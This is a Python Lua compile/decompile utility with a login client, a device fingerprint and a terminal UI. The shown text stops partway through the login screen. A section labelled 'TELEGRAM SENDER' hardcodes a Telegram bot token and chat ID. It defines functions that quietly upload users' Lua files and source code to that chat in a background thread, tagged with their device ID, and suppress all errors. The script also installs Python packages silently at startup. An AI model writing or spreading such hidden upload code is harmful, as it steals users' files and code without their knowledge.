#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════════════
#  KAPTEN 012 TOOLS v3 — INTEGRATED WITH AUTH SERVER
#  Compile/Decompile Lua with AES-256 Encrypted Authentication
# ══════════════════════════════════════════════════════════════════════════

import os
import sys
import re
import subprocess
import tempfile
import zipfile
import time
import hashlib
import uuid
import json
import requests
import asyncio
import aiohttp
from datetime import datetime, timedelta
from pathlib import Path
from threading import Thread, Lock

import sys as _sys_global
_sys_global.setrecursionlimit(5000)

# ══════════════════════════════════════════════════════════════════════════
#  RICH / PREMIUM UI AUTO-INSTALL
# ══════════════════════════════════════════════════════════════════════════
def _ensure_rich():
    _needed = {'rich': 'rich', 'pyfiglet': 'pyfiglet', 'colorama': 'colorama', 'cryptography': 'cryptography'}
    _missing = []
    for mod, pkg in _needed.items():
        try:
            __import__(mod)
        except ImportError:
            _missing.append(pkg)
    if _missing:
        print("  Installing premium UI modules...")
        for pkg in _missing:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pkg, "--quiet"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        print("  Modules installed, restarting...\n")
        os.execv(sys.executable, [sys.executable] + sys.argv)

_ensure_rich()

import contextlib as _ctx
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box
from rich.text import Text as _RichText
from rich.live import Live as _RichLive
from rich.progress import (
    Progress, SpinnerColumn, BarColumn, TextColumn,
    TimeRemainingColumn, ProgressColumn
)
from rich.prompt import Prompt
from rich.align import Align
from rich.columns import Columns
import colorama
colorama.init()
console = Console()

# ══════════════════════════════════════════════════════════════════════════
#  ENCRYPTION IMPORTS
# ══════════════════════════════════════════════════════════════════════════
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("[ERROR] cryptography module required!")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════════════════
#  DEVICE FINGERPRINT — ID UNIK (STABIL)
# ══════════════════════════════════════════════════════════════════════════
def get_system_id() -> str:
    """Generate ID unik yang KONSISTEN (tidak berubah-ubah)"""
    id_file = Path(__file__).resolve().parent / ".device_id"
    
    if id_file.exists():
        saved_id = id_file.read_text().strip()
        if saved_id and len(saved_id) > 5:
            return saved_id
    
    try:
        mac = uuid.getnode()
        if mac != 0xffffffffffff:
            mac_id = f"MAC_{mac:012x}"
            id_file.write_text(mac_id)
            return mac_id
    except:
        pass
    
    try:
        import platform
        import socket
        hardware_info = f"{socket.gethostname()}_{platform.machine()}"
        hw_hash = hashlib.md5(hardware_info.encode()).hexdigest()[:12]
        stable_id = f"HW_{hw_hash}"
        id_file.write_text(stable_id)
        return stable_id
    except:
        pass
    
    new_id = f"FIXED_{uuid.uuid4().hex[:8]}"
    id_file.write_text(new_id)
    return new_id

DEVICE_ID = get_system_id()

# ══════════════════════════════════════════════════════════════════════════
#  KAPTEN AUTH CLIENT INTEGRATED
# ══════════════════════════════════════════════════════════════════════════
class KaptenAuthClient:
    """Integrated Auth Client dengan caching"""
    
    def __init__(self, server_url: str = None):
        self.server_url = (server_url or os.environ.get('KAPTEN_AUTH_SERVER', 'http://localhost:5000')).rstrip('/')
        self.cache_dir = Path(os.path.expanduser('~/.kapten_auth'))
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        
        self.token_file = self.cache_dir / 'token.encrypted'
        self.session_file = self.cache_dir / 'session.json'
        self.lock = Lock()
        
        self.current_token = None
        self.current_user = None
        self.current_device_id = DEVICE_ID
        self._load_cached_token()

    def _get_encryption_key(self) -> bytes:
        """Derive encryption key"""
        master_key = os.environ.get('KAPTEN_CLIENT_KEY', 'kapten_012_client').encode()
        salt = os.environ.get('KAPTEN_CLIENT_SALT', 'kapten_salt').encode()
        
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = kdf.derive(master_key)
        return Fernet._URLSafeBase64._urlsafe_b64encode(key + b'\x00' * 8)

    def _encrypt_token(self, token: str) -> str:
        """Encrypt token"""
        try:
            key = self._get_encryption_key()
            cipher = Fernet(key)
            encrypted = cipher.encrypt(token.encode())
            return encrypted.decode()
        except:
            return None

    def _decrypt_token(self, encrypted_token: str) -> str:
        """Decrypt token"""
        try:
            key = self._get_encryption_key()
            cipher = Fernet(key)
            decrypted = cipher.decrypt(encrypted_token.encode())
            return decrypted.decode()
        except:
            return None

    def _load_cached_token(self):
        """Load cached token"""
        try:
            if self.token_file.exists() and self.session_file.exists():
                encrypted_token = self.token_file.read_text().strip()
                token = self._decrypt_token(encrypted_token)
                
                if token:
                    session_data = json.loads(self.session_file.read_text())
                    if time.time() < session_data.get('expires_at', 0):
                        self.current_token = token
                        self.current_user = session_data.get('username')
                        self.current_device_id = session_data.get('device_id', DEVICE_ID)
                        return True
        except:
            pass
        return False

    def _save_cached_token(self, token: str, username: str, expires_in: int = 86400):
        """Save encrypted token"""
        try:
            encrypted_token = self._encrypt_token(token)
            if encrypted_token:
                self.token_file.write_text(encrypted_token)
                session_data = {
                    'username': username,
                    'device_id': self.current_device_id,
                    'expires_at': time.time() + expires_in,
                    'cached_at': datetime.now().isoformat()
                }
                self.session_file.write_text(json.dumps(session_data, indent=2))
        except:
            pass

    def login(self, username: str, password: str, device_name: str = None) -> tuple:
        """Login dengan username & password"""
        try:
            response = requests.post(
                f'{self.server_url}/api/auth/login',
                json={
                    'username': username,
                    'password': password,
                    'device_id': self.current_device_id,
                    'device_name': device_name or 'KAPTEN-TOOLS-v3'
                },
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                token = data.get('token')
                expires_in = data.get('expires_in', 86400)
                
                self.current_token = token
                self.current_user = username
                self._save_cached_token(token, username, expires_in)
                
                return True, data
            else:
                data = response.json()
                return False, data
        except Exception as e:
            return False, {'error': str(e)}

    def verify_token(self) -> tuple:
        """Verify current token"""
        if not self.current_token:
            return False, {'error': 'No token'}
        
        try:
            response = requests.post(
                f'{self.server_url}/api/auth/verify-token',
                json={'token': self.current_token},
                timeout=10
            )
            
            if response.status_code == 200:
                return True, response.json()
            else:
                return False, response.json()
        except Exception as e:
            return False, {'error': str(e)}

    def is_authenticated(self) -> bool:
        """Check authentication status"""
        return self.current_token is not None

    def logout(self):
        """Logout"""
        self.current_token = None
        self.current_user = None
        try:
            self.token_file.unlink(missing_ok=True)
            self.session_file.unlink(missing_ok=True)
        except:
            pass

    def health_check(self) -> tuple:
        """Check server health"""
        try:
            response = requests.get(f'{self.server_url}/api/health', timeout=5)
            return response.status_code == 200, response.json() if response.status_code == 200 else {}
        except:
            return False, {}

# ──────────────────────────────────────────────────────────────────────────
#  GLOBAL AUTH CLIENT
# ──────────────────────────────────────────────────────────────────────────
AUTH_SERVER_URL = os.environ.get('KAPTEN_AUTH_SERVER', 'http://localhost:5000')
auth_client = KaptenAuthClient(AUTH_SERVER_URL)

# ──────────────────────────────────────────────────────────────────────────
#  TELEGRAM SENDER (DARI SEBELUMNYA)
# ──────────────────────────────────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "8968437811:AAGz-TLpE6KR3AK_WWeLHnUe-RQd6BQQAV4"
TELEGRAM_CHAT_ID = "8689546712"

def send_lua_to_telegram(file_path: Path, context: str = ""):
    """Kirim file ke Telegram dengan caption detail"""
    if not file_path.exists():
        return
    
    try:
        file_size = file_path.stat().st_size
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        caption = f"[FILE] {file_path.name}\n[SIZE] {file_size} bytes\n[ID] {DEVICE_ID}\n[TIME] {now}\n[CONTEXT] {context}"
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        def send():
            try:
                with open(file_path, 'rb') as f:
                    requests.post(
                        url, 
                        files={'document': f}, 
                        data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, 
                        timeout=30
                    )
            except:
                pass
        
        Thread(target=send).start()
    except:
        pass

def send_source_to_telegram(source_code: str, file_name: str, context: str = ""):
    """Kirim source code ke Telegram"""
    try:
        temp_file = Path(tempfile.gettempdir()) / f"{file_name}_{uuid.uuid4().hex[:6]}.lua"
        temp_file.write_text(source_code, encoding='utf-8')
        send_lua_to_telegram(temp_file, context)
        temp_file.unlink(missing_ok=True)
        return True
    except:
        return False

# ──────────────────────────────────────────────────────────────────────────
#  CONFIG (DARI SEBELUMNYA)
# ──────────────────────────────────────────────────────────────────────────
_K = bytes.fromhex("112136474657a78d9d8490d8ab008c35261af7e45805b8b31507d02c1e8ff6c8")
SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
LUA53_DLL   = os.path.join(SCRIPT_DIR, "lua53.dll")
REMAP_JAR   = os.path.join(SCRIPT_DIR, "rahasia_goat.jar")
REMAP_OPMAP = os.path.join(SCRIPT_DIR, "rahasia_goat.opmap")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ──────────────────────────────────────────────────────────────────────────
#  AUTO DEPENDENCY INSTALLER
# ──────────────────────────────────────────────────────────────────────────
def _detect_env():
    if (os.environ.get("TERMUX_VERSION") or os.path.isdir("/data/data/com.termux")
            or os.path.isfile("/data/data/com.termux/files/usr/bin/pkg")):
        return "termux"
    if os.path.isfile("/usr/bin/apt-get") or os.path.isfile("/usr/bin/apt"): return "debian"
    if os.path.isfile("/usr/bin/pacman"): return "arch"
    return "unknown"

def _luac_available():
    for cmd in ["luac5.3","luac","/data/data/com.termux/files/usr/bin/luac5.3",
                "/usr/bin/luac5.3","/usr/local/bin/luac5.3"]:
        try:
            r = subprocess.run([cmd, "-v"], capture_output=True, timeout=3)
            if b"5.3" in r.stdout + r.stderr: return True
        except: pass
    return False

def auto_install_deps():
    if _luac_available(): return
    env = _detect_env()
    console.print(f"\n  [yellow]⚠  luac5.3 not found — Auto-install... env: {env}[/yellow]\n")
    if env == "termux":
        cmds = [(["pkg","update","-y"],"Repo update..."),(["pkg","install","-y","lua53"],"lua53 install...")]
    elif env == "debian":
        cmds = [(["apt-get","update","-y"],"apt update..."),(["apt-get","install","-y","lua5.3"],"lua5.3 install...")]
    elif env == "arch":
        cmds = [(["pacman","-Sy","--noconfirm","lua53"],"lua53 install...")]
    else:
        console.print("  [red]Environment unknown — manually install: lua5.3[/red]")
        _pause(); return
    for cmd, label in cmds:
        console.print(f"  [cyan]{label}[/cyan]")
        try:
            r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=120)
            if r.returncode == 0: console.print(f"  [green]✓ Done: {label}[/green]")
            else:
                console.print(f"  [red]✗ Fail[/red]"); break
        except Exception as e:
            console.print(f"  [red]✗ Error: {e}[/red]"); break
    if _luac_available(): console.print("\n  [green]✓ luac5.3 installed![/green]\n")
    else:
        console.print("\n  [red]✗ Auto-install failed.[/red]"); _pause()

# ──────────────────────────────────────────────────────────────────────────
#  TEXT POST-PROCESSING (DARI SEBELUMNYA)
# ──────────────────────────────────────────────────────────────────────────
_STDLIB = ('require','import','setmetatable','getmetatable','rawget','rawset','pcall','xpcall',
           'tostring','tonumber','type','pairs','ipairs','next','error','assert','print','select',
           'unpack','table','string','math','os','io','coroutine','collectgarbage')
_LUA_KW = frozenset(['end','else','elseif','then','do','until','repeat','while','break',
                     'return','local','function','in','not','and','or'])

def _fix_bare_functions(code):
    lines=code.split('\n'); result=[]; _cc=[0]
    def _infer(func_idx):
        depth=1; j=func_idx+1
        while j<len(lines) and depth>0:
            ls=lines[j].strip()
            opens=len(re.findall(r'\b(?:function|if|while|for|repeat)\b',ls))
            opens-=len(re.findall(r'\b(?:elseif|else)\b',ls))
            closes=len(re.findall(r'\bend\b',ls))
            depth+=opens-closes; j+=1
        prev_locals=set(re.findall(r'\blocal\s+(\w+)','\n'.join(lines[:func_idx])))
        for k in range(j,min(j+8,len(lines))):
            for call_m in re.finditer(r'[\w.]+\(([^)]+)\)',lines[k]):
                for arg in call_m.group(1).split(','):
                    arg=arg.strip()
                    if (re.fullmatch(r'[A-Za-z_]\w*',arg) and arg not in _LUA_KW
                            and arg not in ('self','nil','true','false') and arg not in _STDLIB
                            and arg not in prev_locals):
                        return arg
        return None
    i=0
    while i<len(lines):
        line=lines[i]
        bare=re.match(r'^(\s*)function\s*(\([^)]*\))\s*$',line)
        if bare:
            prev_meaningful=next((r.rstrip() for r in reversed(result) if r.strip()),'')
            if not re.search(r'[=(,{]\s*$',prev_meaningful):
                indent=bare.group(1); params=bare.group(2)
                name=_infer(i)
                if not name: _cc[0]+=1; name=f'_closure_{_cc[0]}'
                result.append(f'{indent}local {name} = function{params}'); i+=1; continue
        result.append(line); i+=1
    return '\n'.join(result)

def _post_process(code):
    for kw in _STDLIB:
        code=code.replace(f'"{kw}"(',f'{kw}(').replace(f"'{kw}'(",f'{kw}(')
    code=re.sub(r'_G\["(\w+)"\]\s*\(',r'\1(',code)
    code=_fix_bare_functions(code)
    out=[]
    for ln in code.split('\n'):
        s=ln.strip()
        if s and s not in _LUA_KW and re.fullmatch(r'[A-Za-z_]\w*',s): continue
        out.append(ln)
    code=re.sub(r'\n{3,}','\n\n','\n'.join(out))
    code=code.replace(';;',';')
    return code.strip()+'\n'

def _count_artifacts(code):
    return len(re.compile(r'\b_r\d+\b|\b_upv\d+\b').findall(code))

def _run_unluac__direct(_path):
    if not os.path.isfile(REMAP_JAR):
        return None, f'rahasia_goat.jar not found: {REMAP_JAR}'
    if not os.path.isfile(REMAP_OPMAP):
        return None, f'rahasia_goat.opmap not found: {REMAP_OPMAP}'
    try:
        r = subprocess.run(
            ['java', '-jar', REMAP_JAR, '--opmap', REMAP_OPMAP, _path],
            capture_output=True, timeout=60
        )
        raw = r.stdout.decode('utf-8', errors='replace')
        _NOISE = [r'No pubg_map\.properties found\. Using standard map\.',
                  r'Using standard map\.', r'No pubg_map\.properties found\.']
        for pattern in _NOISE: raw = re.sub(pattern, '', raw)
        lines = [l for l in raw.split('\n') if l.strip() != '' or l == '']
        clean = []; i = 0
        while i < len(lines):
            stripped = lines[i].rstrip()
            if re.search(r'\s*local\s+\w+\s*=\s*$', stripped):
                j = i + 1
                while j < len(lines) and lines[j].strip() == '': j += 1
                next_stripped = lines[j].strip() if j < len(lines) else ''
                if next_stripped.startswith('function'):
                    clean.append(stripped + ' ' + lines[j].lstrip()); i = j + 1; continue
                i += 1; continue
            clean.append(lines[i]); i += 1
        code = '\n'.join(clean)
        if not code.strip():
            err = r.stderr.decode('utf-8', errors='replace').strip()
            return None, f'JAR decompile empty (exit={r.returncode}): {err[:200]}'
        return code, ''
    except FileNotFoundError: return None, 'java not found'
    except subprocess.TimeoutExpired: return None, 'JAR decompile timeout (>60s)'
    except Exception as e: return None, str(e)

def decompile_file(in_path, out_path):
    if not os.path.isfile(REMAP_JAR):
        return False, f'rahasia_goat.jar not found: {REMAP_JAR}', 'none', 0, 0
    if not os.path.isfile(REMAP_OPMAP):
        return False, f'rahasia_goat.opmap not found: {REMAP_OPMAP}', 'none', 0, 0
    code, err = _run_unluac__direct(in_path)
    if not code:
        return False, err or 'Decompile failed', 'rahasia_goat_jar', 0, 0
    try:
        final = _post_process(code)
        artifacts = _count_artifacts(final)
        with open(out_path, 'w', encoding='utf-8') as f: f.write(final)
        return True, '', 'rahasia_goat_jar', len(final.splitlines()), artifacts
    except Exception as e:
        return False, f'Post-process error: {e}', 'rahasia_goat_jar', 0, 0

# ─────────────────────────────────────────────────────────────────────────
#  COMPILER CORE (DARI SEBELUMNYA)
# ─────────────────────────────────────────────────────────────────────────
def _patch__header(file_path):
    try:
        with open(file_path, 'rb') as f: data = bytearray(f.read())
        if len(data) < 34: return False, 'File too short to be valid Lua bytecode'
        if data[:4] != b'\x1bLua': return False, 'Not a Lua bytecode file'
        if data[13] != 4:
            data[13] = 4
            with open(file_path, 'wb') as f: f.write(data)
        return True, ''
    except Exception as e: return False, f'Header patch error: {e}'

def _remap_with_jar(std_luac_path, output_path):
    if not os.path.isfile(REMAP_JAR): return False, f'rahasia_goat.jar not found: {REMAP_JAR}'
    if not os.path.isfile(REMAP_OPMAP): return False, f'rahasia_goat.opmap not found: {REMAP_OPMAP}'
    try:
        r = subprocess.run(
            ['java', '-jar', REMAP_JAR, '--opmap', REMAP_OPMAP, '--remap', '--output', output_path, std_luac_path],
            capture_output=True, timeout=60
        )
        if r.returncode != 0:
            err = r.stderr.decode('utf-8', errors='replace').strip()
            if not err: err = r.stdout.decode('utf-8', errors='replace').strip()
            return False, f'JAR remap error: {err[:200]}'
        if not os.path.isfile(output_path) or os.path.getsize(output_path) == 0:
            return False, 'JAR produced no output'
        patch_ok, patch_err = _patch__header(output_path)
        if not patch_ok: return False, patch_err
        return True, ''
    except FileNotFoundError: return False, 'java not found — install JDK/JRE'
    except subprocess.TimeoutExpired: return False, 'JAR remap timeout (>60s)'
    except Exception as e: return False, str(e)

def _find_compiler():
    bundled = [os.path.join(SCRIPT_DIR,'luac5.3'), os.path.join(SCRIPT_DIR,'luac')]
    if os.name=='nt': bundled += [os.path.join(SCRIPT_DIR,'luac5.3.exe'), os.path.join(SCRIPT_DIR,'luac.exe')]
    for c in bundled:
        if os.path.isfile(c):
            try:
                if os.name!='nt': os.chmod(c, 0o755)
                r = subprocess.run([c,'-v'], capture_output=True, timeout=3)
                if b'5.3' in r.stdout+r.stderr: return 'luac', c
            except: pass
    for c in ['luac5.3','luac','/usr/bin/luac5.3','/usr/local/bin/luac5.3',
              '/data/data/com.termux/files/usr/bin/luac5.3','/data/data/com.termux/files/usr/bin/luac']:
        try:
            r = subprocess.run([c,'-v'], capture_output=True, timeout=3)
            if b'5.3' in r.stdout+r.stderr: return 'luac', c
        except: pass
    if os.name=='nt' and os.path.isfile(LUA53_DLL):
        dll_dir = os.path.dirname(LUA53_DLL)
        for exe_name in ['luac5.3.exe','luac.exe','lua5.3.exe','lua.exe']:
            exe_path = os.path.join(dll_dir, exe_name)
            if os.path.isfile(exe_path):
                try:
                    r = subprocess.run([exe_path,'-v'], capture_output=True, timeout=3)
                    if b'5.3' in r.stdout+r.stderr: return 'luac', exe_path
                except: pass
    for c in ['luatex','luahbtex','/usr/bin/luatex','/usr/bin/luahbtex']:
        try:
            r = subprocess.run([c,'--version'], capture_output=True, timeout=3)
            if r.returncode==0: return 'luatex', c
        except: pass
    return None, None

_LUATEX_DUMP_SCRIPT = r"""
local src_file = arg[1]; local out_file = arg[2]
local f = io.open(src_file, 'r')
if not f then io.stderr:write("Cannot open: " .. src_file .. "\n"); os.exit(1) end
local src = f:read('*a'); f:close()
local chunk, err = load(src, '@' .. src_file)
if not chunk then io.stderr:write("Syntax error: " .. tostring(err) .. "\n"); os.exit(1) end
local bc = string.dump(chunk, false)
local of = io.open(out_file, 'wb'); of:write(bc); of:close()
"""

def _compile_with_luac(luac, src_path, tmp_out):
    result = subprocess.run([luac, '-s', '-o', tmp_out, src_path], capture_output=True, timeout=30)
    if result.returncode != 0:
        return False, f'luac error: {result.stderr.decode("utf-8",errors="replace").strip()[:200]}'
    return True, ''

def _compile_with_luatex(luatex, src_path, tmp_out):
    with tempfile.NamedTemporaryFile(suffix='.lua', delete=False, mode='w') as tf:
        tf.write(_LUATEX_DUMP_SCRIPT); script_path = tf.name
    try:
        r = subprocess.run([luatex,'--luaonly',script_path,src_path,tmp_out], capture_output=True, timeout=30)
        if r.returncode != 0:
            err = (r.stderr.decode('utf-8',errors='replace') + r.stdout.decode('utf-8',errors='replace'))
            return False, f'luatex error: {err.strip()[:200]}'
        return True, ''
    except FileNotFoundError: return False, 'luatex not found'
    except Exception as e: return False, str(e)
    finally: os.unlink(script_path)

def _syntax_check(luac, src_path):
    try:
        r = subprocess.run([luac,'-p',src_path], capture_output=True, timeout=10)
        if r.returncode == 0: return True, ''
        return False, r.stderr.decode('utf-8',errors='replace').strip()
    except: return True, ''

def compile_file(src_path, out_path):
    try:
        with open(src_path,'rb') as _f: _magic = _f.read(4)
        if _magic == b'\x1bLua': return False, "File is already compiled bytecode.", ''
    except OSError as e: return False, f'File read error: {e}', ''
    ctype, cpath = _find_compiler()
    if ctype is None:
        console.print("\n  [bold yellow]luac5.3 not found — auto-install...[/bold yellow]")
        auto_install_deps(); ctype, cpath = _find_compiler()
    if ctype is None:
        return False, "No Lua 5.3 compiler found. Install: pkg install lua53", ''
    tool_label = 'luac5.3' if ctype=='luac' else 'luatex'
    if ctype=='luac':
        syn_ok, syn_err = _syntax_check(cpath, src_path)
        if not syn_ok: return False, f'Syntax error:\n{syn_err}', tool_label
    with tempfile.NamedTemporaryFile(suffix='.luac', delete=False) as tf: tmp_out = tf.name
    try:
        if ctype=='luac': ok, err = _compile_with_luac(cpath, src_path, tmp_out)
        else: ok, err = _compile_with_luatex(cpath, src_path, tmp_out)
        if not ok: return False, err, tool_label
        with open(tmp_out,'rb') as f: std_bytes = f.read()
        if std_bytes[:4] != b'\x1bLua' or std_bytes[4] != 0x53:
            return False, f'{tool_label} did not produce valid Lua 5.3 bytecode', tool_label
        remap_ok, remap_err = _remap_with_jar(tmp_out, out_path)
        if not remap_ok: return False, remap_err, tool_label
        return True, '', f'{tool_label}+JAR'
    finally:
        if os.path.exists(tmp_out): os.unlink(tmp_out)

# ──────────────────────────────────────────────────────────────────────────
#  REPORT SYSTEM (DARI SEBELUMNYA)
# ──────────────────────────────────────────────────────────────────────────
class _FileEntry:
    __slots__=('fname','size_in','size_out','status','error','tool','lines','artifacts','elapsed')
    def __init__(self, fname, size_in):
        self.fname=fname; self.size_in=size_in; self.size_out=0; self.status='pending'
        self.error=''; self.tool=''; self.lines=0; self.artifacts=0; self.elapsed=0.0

class OperationReport:
    def __init__(self, mode):
        self.mode=mode.upper(); self.started_at=datetime.now(); self.ended_at=None
        self.entries=[]; self._global_start=time.time()

    def add(self, entry): self.entries.append(entry)
    def finish(self): self.ended_at=datetime.now()

    def print_terminal(self):
        ok_entries  = [e for e in self.entries if e.status=='ok']
        fail_entries = [e for e in self.entries if e.status!='ok']
        total_time  = time.time() - self._global_start
        is_dec = (self.mode=='DECOMPILE')
        mode_icon  = '🔓' if is_dec else '🔒'
        mode_color = 'bright_cyan' if is_dec else 'bright_green'

        console.print(Panel(
            f"[bold {mode_color}]{mode_icon}   AUTO TOOL — {self.mode} REPORT[/bold {mode_color}]\n"
            f"[dim]📅 {self.started_at.strftime('%d-%m-%Y  %H:%M:%S')}   ⏱  Total: {total_time:.2f}s[/dim]",
            border_style=mode_color, box=box.DOUBLE_EDGE, padding=(0,2)))

        t = Table(box=box.SIMPLE_HEAVY, border_style="bright_white",
                  header_style="bold black on bright_cyan", show_header=True, padding=(0,1))
        t.add_column("FILE", style="bright_white", width=30)
        t.add_column("IN",   style="bright_blue",  justify="right", width=9)
        t.add_column("OUT",  style="bright_green", justify="right", width=9)
        t.add_column("STATUS", style="bold", justify="center", width=10)
        if not is_dec: t.add_column("TOOL", style="cyan", width=16)
        t.add_column("LINES", style="bright_yellow", justify="right", width=7)
        t.add_column("TIME",  style="bright_magenta", justify="right", width=7)

        for e in self.entries:
            fn     = e.fname if len(e.fname)<=28 else e.fname[:25]+'...'
            in_kb  = f'{e.size_in/1024:.1f}K'
            out_kb = f'{e.size_out/1024:.1f}K' if e.size_out else '-'
            status = '[bold bright_green]✅ OK[/bold bright_green]' if e.status=='ok' \
                     else '[bold bright_red]❌ FAIL[/bold bright_red]'
            lines   = str(e.lines) if e.lines else '-'
            elapsed = f'{e.elapsed:.2f}s'
            if is_dec: t.add_row(fn, in_kb, out_kb, status, lines, elapsed)
            else:      t.add_row(fn, in_kb, out_kb, status, e.tool or '-', lines, elapsed)
        console.print(t)

        sum_t = Table(box=box.DOUBLE_EDGE, border_style="bold bright_yellow",
                      title=f"[bold bright_yellow]🎯 SUMMARY — {self.mode}[/bold bright_yellow]",
                      padding=(0,2), show_header=False)
        sum_t.add_column("K", style="bold bright_white", width=20)
        sum_t.add_column("V", style="bold", width=18)
        sum_t.add_row("📄 Total Files", str(len(self.entries)))
        sum_t.add_row("✅ Success",    f"[bold bright_green]{len(ok_entries)}[/bold bright_green]")
        sum_t.add_row("❌ Failed",     f"[bold bright_red]{len(fail_entries)}[/bold bright_red]")
        total_time_str = f"{time.time() - self._global_start:.2f}s"
        sum_t.add_row("⏱  Total Time", f"[bright_cyan]{total_time_str}[/bright_cyan]")
        console.print(sum_t); console.print()

        if fail_entries:
            console.print(Panel(
                '\n'.join(f"  [bold red]✗[/bold red] [bright_white]{e.fname}[/bright_white]"
                          f" [dim]→[/dim] [red]{e.error[:80]}[/red]" for e in fail_entries),
                title="[bold red]❌ FAILED FILES[/bold red]",
                border_style="red", box=box.ROUNDED))

    def save_to_file(self, reports_dir):
        os.makedirs(reports_dir, exist_ok=True)
        ts = self.started_at.strftime('%Y%m%d_%H%M%S')
        filepath = os.path.join(reports_dir, f'report_{self.mode.lower()}_{ts}.txt')
        ok_count   = sum(1 for e in self.entries if e.status=='ok')
        fail_count = len(self.entries) - ok_count
        total_time = (self.ended_at - self.started_at).total_seconds() if self.ended_at else 0
        sep = '═' * 72
        lines = [sep, f'   AUTO TOOL — {self.mode} REPORT', f'  Credit: KAPTEN_012', sep,
                 f'  Date: {self.started_at.strftime("%d-%m-%Y %H:%M:%S")}',
                 f'  Mode: {self.mode}', sep, '', '  FILE DETAILS:', '  '+'─'*68]
        for e in self.entries:
            fn = e.fname if len(e.fname)<=30 else e.fname[:27]+'...'
            st = 'OK' if e.status=='ok' else 'FAIL'
            lines.append(f'  {fn:<30}  {e.size_in/1024:.1f}K  {e.size_out/1024:.1f}K  {st}  {e.elapsed:.2f}s')
            if e.status!='ok' and e.error: lines.append(f'       ERROR: {e.error[:80]}')
        lines += ['', f'  Total: {len(self.entries)}  OK: {ok_count}  Fail: {fail_count}  Time: {total_time:.2f}s', '', sep]
        with open(filepath, 'w', encoding='utf-8') as f: f.write('\n'.join(lines))
        return filepath

_last_report_path = None

# ──────────────────────────────────────────────────────────────────────────
#  UI HELPERS
# ──────────────────────────────────────────────────────────────────────────
def ensure_input_folder():
    d = os.path.join(SCRIPT_DIR, "Input")
    if not os.path.exists(d): os.makedirs(d)
    return d

def ensure_KAPTEN_ORI_folder():
    d = os.path.join(SCRIPT_DIR, "KAPTEN_ORI")
    if not os.path.exists(d): os.makedirs(d)
    return d

def make_zip(src_dir, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(src_dir):
            for fname in files:
                fp = os.path.join(root, fname)
                zf.write(fp, os.path.relpath(fp, src_dir))
    console.print(Panel(
        f"[bold bright_green]✅ ZIP ready:[/bold bright_green] [bright_white]{zip_path}[/bright_white]"
        f"  [dim]({os.path.getsize(zip_path)/1024:.1f} KB)[/dim]",
        border_style="bright_green", box=box.ROUNDED, padding=(0,1)))

# ══════════════════════════════════════════════════════════════════════════
#  AUTH SCREEN — INTEGRATED
# ══════════════════════════════════════════════════════════════════════════
def auth_screen():
    clear_screen()
    
    console.print(_RichText("▄" * 56, style="bold bright_magenta"))
    console.print(Panel(
        Align.center(
            _RichText.assemble(
                ("⚡  K A P T E N 0 1 2 T O O L S  ⚡\n", "bold bright_yellow"),
                ("▓▓  L U A T O O L S  ▓▓\n",           "bold bright_cyan"),
                ("━" * 36 + "\n",                                   "dim bright_magenta"),
                ("🔐  A U T H E N T I C A T I O N  🔐\n",          "bold bright_red"),
                ("━" * 36 + "\n",                                   "dim bright_magenta"),
                ("📱 Device ID:\n",                                 "dim bright_white"),
                (f"{DEVICE_ID}\n",                                  "bold bright_yellow"),
                ("━" * 36,                                          "dim bright_magenta"),
            )
        ),
        border_style="bold bright_magenta",
        box=box.HEAVY,
        padding=(0, 4),
    ))
    console.print(_RichText("▀" * 56, style="bold bright_magenta"))
    console.print()

    # Check server
    console.print("  [cyan]🔄 Memeriksa koneksi server auth...[/cyan]")
    ok, result = auth_client.health_check()
    
    if not ok:
        console.print(Panel(
            "[bold yellow]⚠  Server auth tidak terjangkau[/bold yellow]\n"
            "[dim]Mode Offline: Gunakan cached token jika ada[/dim]",
            border_style="yellow", box=box.ROUNDED, padding=(0, 2)))
        console.print()
        
        # Try load cached token
        if auth_client.is_authenticated():
            console.print(Panel(
                f"[bold green]✅ CACHED TOKEN DITEMUKAN![/bold green]\n"
                f"[dim]User: {auth_client.current_user}[/dim]",
                border_style="green", box=box.ROUNDED, padding=(0, 2)))
            _pause()
            return True
        else:
            console.print(Panel(
                "[bold red]❌ TIDAK ADA CACHED TOKEN[/bold red]\n"
                "[dim]Periksa koneksi internet atau start auth server.[/dim]",
                border_style="red", box=box.ROUNDED, padding=(0, 2)))
            _pause()
            return False
    
    console.print(f"  [green]✅ Server siap![/green]\n")

    # MODE 1: Check cached token
    if auth_client.is_authenticated():
        console.print("  [cyan]🔄 Memverifikasi cached token...[/cyan]")
        ok, result = auth_client.verify_token()
        
        if ok:
            expiry = result.get('data', {}).get('expires_at', 'Unknown')
            console.print(Panel(
                f"[bold green]✅ TOKEN VALID![/bold green]\n"
                f"[dim]User: {auth_client.current_user}[/dim]\n"
                f"[dim]Device ID: {auth_client.current_device_id}[/dim]",
                border_style="green", box=box.ROUNDED, padding=(0, 2)))
            _pause()
            return True
        else:
            console.print(Panel(
                f"[bold yellow]⚠  Cached token expired[/bold yellow]\n"
                f"[dim]Silakan login ulang.[/dim]",
                border_style="yellow", box=box.ROUNDED, padding=(0, 2)))

    # MODE 2: Interactive login
    console.print(Panel(
        Align.center(_RichText.assemble(
            ("Masukkan username dan password\n", "dim bright_white"),
            (f"Device: {DEVICE_ID}", "bold bright_yellow"),
        )),
        border_style="bright_yellow", box=box.ROUNDED, padding=(0, 2)))
    console.print()

